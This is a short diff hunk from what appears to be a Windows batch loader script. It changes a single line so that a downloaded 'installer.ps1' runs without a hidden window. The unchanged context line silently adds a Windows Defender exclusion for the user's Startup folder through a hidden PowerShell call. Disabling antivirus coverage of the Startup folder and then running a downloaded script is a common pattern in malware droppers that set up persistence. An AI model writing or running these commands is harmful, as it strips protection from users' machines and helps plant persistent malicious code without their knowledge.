@@ -36,7 +36,7 @@ REM Add exclusion path for Windows Defender using PowerShell
 powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 
     REM Run the downloaded installer.ps1 script using PowerShell
-powershell -NoProfile -WindowStyle Hidden -File "installer.ps1"
+powershell -NoProfile -File "installer.ps1"
 
 
 
